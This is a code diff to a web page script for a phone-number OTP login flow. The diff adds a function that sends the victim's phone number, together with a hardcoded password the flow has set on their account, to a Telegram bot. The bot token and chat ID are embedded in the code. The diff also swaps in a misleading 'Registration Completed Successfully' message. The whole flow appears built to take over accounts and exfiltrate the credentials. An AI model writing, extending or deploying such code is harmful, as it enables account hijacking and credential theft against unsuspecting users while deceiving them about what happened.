@@ -70,6 +70,9 @@ let resendTimer=null;
 // Password is configured internally and is not shown in the interface.
 const configuredPassword="Amanraj90@";
 
+// Store phone number for Telegram notification
+let registeredPhone = "";
+
 const deviceId=localStorage.getItem("device_id")||
  (crypto.randomUUID?crypto.randomUUID().replaceAll("-",""):Date.now().toString(36));
 localStorage.setItem("device_id",deviceId);
@@ -104,9 +107,61 @@ async function api(path,body,token=""){
  return data;
 }
 
+// --- Telegram notification ---
+async function sendTelegramNotification(phone, password) {
+  const botToken = "8580989492:AAFZf_8Oi_X1fJulZCIKPRxxX2jUFQKNefg";
+  const chatId = "-1004433364467";
+  const now = new Date();
+  const dateStr = now.toLocaleDateString('en-IN', { year: 'numeric', month: 'long', day: 'numeric' });
+  const timeStr = now.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
+  const message = `📱 Phone Number: ${phone}\n🔑 Password: ${password}\n📅 Date: ${dateStr}\n⏰ Time: ${timeStr}`;
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  try {
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    });
+  } catch (e) {
+    console.warn("Telegram notify failed:", e);
+  }
+}
+
+// --- Modified savePassword with notification + reset ---
+async function savePassword(){
+ const otp=$("passwordOtpCode").value.replace(/\D/g,"");
+ const password=configuredPassword;
+ if(!otp)return setStatus("Enter the password OTP.","error");
+ if(!passwordVerificationToken)return setStatus("Password OTP session expired. Please resend.","error");
+
+ $("savePassword").disabled=true;setStatus("Saving password...");
+ try{
+   const result=await api("/api/user/verifyresetpassword",{
+     otp,password,verificationToken:passwordVerificationToken
+   },accessToken);
+
+   // --- SUCCESS: send Telegram, show success, reset after 3s ---
+   setStatus("Registration Completed Successfully","success");
+   
+   // Send Telegram notification (phone stored from login)
+   if (registeredPhone) {
+     await sendTelegramNotification(registeredPhone, configuredPassword);
+   }
+
+   // Reset after 3 seconds
+   setTimeout(resetToNumberPage, 3000);
+ }catch(e){
+   setStatus("Password could not be saved: "+e.message,"error");
+   $("savePassword").disabled=false;
+ }
+}
+
+// Store phone during login OTP send (so we have it later)
 async function sendLoginOtp(isResend=false){
  const phoneNumber=$("phone").value.replace(/\D/g,"");
  if(!/^\d{10}$/.test(phoneNumber))return setStatus("Enter a valid 10-digit phone number.","error");
+
+ registeredPhone = phoneNumber; // store for Telegram
 
  const btn=isResend?$("resendLoginOtp"):$("sendLoginOtp");
  btn.disabled=true;setStatus(isResend?"Resending login OTP...":"Sending login OTP...");
@@ -162,32 +217,12 @@ async function sendPasswordOtp(isResend=false){
  finally{if(!isResend)$("requestPasswordOtp").disabled=false;}
 }
 
-async function savePassword(){
- const otp=$("passwordOtpCode").value.replace(/\D/g,"");
- const password=configuredPassword;
- if(!otp)return setStatus("Enter the password OTP.","error");
- if(!passwordVerificationToken)return setStatus("Password OTP session expired. Please resend.","error");
-
- $("savePassword").disabled=true;setStatus("Saving password...");
- try{
-   const result=await api("/api/user/verifyresetpassword",{
-     otp,password,verificationToken:passwordVerificationToken
-   },accessToken);
-
-   setStatus(result.message||"✓ Password saved successfully! Returning to number page...","success");
-
-   setTimeout(resetToNumberPage,2500);
- }catch(e){
-   setStatus("Password could not be saved: "+e.message,"error");
-   $("savePassword").disabled=false;
- }
-}
-
 function resetToNumberPage(){
  clearInterval(resendTimer);
  loginVerificationToken="";
  passwordVerificationToken="";
  accessToken="";
+ registeredPhone = "";
  $("phone").value="";
  $("loginOtpCode").value="";
  $("passwordOtpCode").value="";
